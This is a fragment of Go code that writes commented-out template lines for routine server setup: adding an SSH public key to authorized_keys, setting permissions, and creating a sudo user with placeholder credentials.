	lf.Contents += "# echo '<YOUR-SSH-PUBLIC-KEY>' >> ~/.ssh/authorized_keys\n"
	lf.Contents += "# chmod 700 ~/.ssh\n"
	lf.Contents += "# chmod 600 ~/.ssh/authorized_keys\n"
	lf.Contents += "#\n"
	lf.Contents += "# # Create new sudo user\n"
	lf.Contents += "# useradd -m -s /bin/bash <username>\n"
	lf.Contents += "# echo '<username>:<password>' | chpasswd\n"
	lf.Contents += "# usermod -aG sudo <username>\n\n"
}
